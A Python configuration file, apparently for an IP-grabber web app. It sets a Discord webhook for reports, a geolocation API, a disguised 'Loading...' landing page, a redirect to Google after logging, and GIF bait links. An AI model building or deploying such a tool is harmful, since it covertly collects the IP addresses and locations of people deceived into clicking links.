import os

class Config:
    # 📡 Discord Webhook URL - Replace with your webhook URL
    DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "YOUR_WEBHOOK_URL_HERE")
    
    # 🌐 Server Configuration
    HOST = os.getenv("HOST", "0.0.0.0")
    PORT = int(os.getenv("PORT", 5000))
    DEBUG = os.getenv("DEBUG", "False").lower() == "true"
    SECRET_KEY = os.getenv("SECRET_KEY", "change-this-secret-key-in-production")
    
    # 📍 IP Geolocation API
    IP_API_SERVICE = os.getenv("IP_API_SERVICE", "ipapi")  # Options: ipapi, ipwhois, ipgeolocation
    
    # 🌍 GeoAPI Keys (optional - free tier works without)
    IPAPI_KEY = os.getenv("IPAPI_KEY", "")
    
    # 🔄 Redirect URL - Where users are redirected after logging
    REDIRECT_URL = os.getenv("REDIRECT_URL", "https://www.google.com")
    
    # 🎨 Landing Page Configuration
    LANDING_PAGE_TITLE = os.getenv("LANDING_PAGE_TITLE", "Loading...")
    LANDING_PAGE_MESSAGE = os.getenv("LANDING_PAGE_MESSAGE", "Redirecting you to the requested page...")
    
    # 🎬 Custom GIF/Video Links (7 slots)
    # Replace the URLs below with your desired media links
    MEDIA_LINKS = {
        "1113": os.getenv("GIF_1113", "https://media.giphy.com/media/l0HlNQ03J5J07t0HC/giphy.gif"),
        "1114": os.getenv("GIF_1114", "https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif"),
        "1115": os.getenv("GIF_1115", "https://media.giphy.com/media/l2YwWpMmQF55Dn8Is/giphy.gif"),
        "1116": os.getenv("GIF_1116", "https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif"),
        "1117": os.getenv("GIF_1117", "https://media.giphy.com/media/l41lFw057lAJcwgTm/giphy.gif"),
        "1118": os.getenv("GIF_1118", "https://media.giphy.com/media/xT0xeMA62E1XIl52Ew/giphy.gif"),
        "1119": os.getenv("GIF_1119", "https://media.giphy.com/media/l3q2K5jinAlChoCLS/giphy.gif"),
    }
    
    # 🛡️ Rate limiting (requests per IP per minute)
    RATE_LIMIT = int(os.getenv("RATE_LIMIT", 10))
    
    # 📊 Logging
    ENABLE_CONSOLE_LOGS = os.getenv("ENABLE_CONSOLE_LOGS", "True").lower() == "true"
    ENABLE_FILE_LOGS = os.getenv("ENABLE_FILE_LOGS", "True").lower() == "true"
    LOG_FILE_PATH = os.getenv("LOG_FILE_PATH", "logs/access.log")
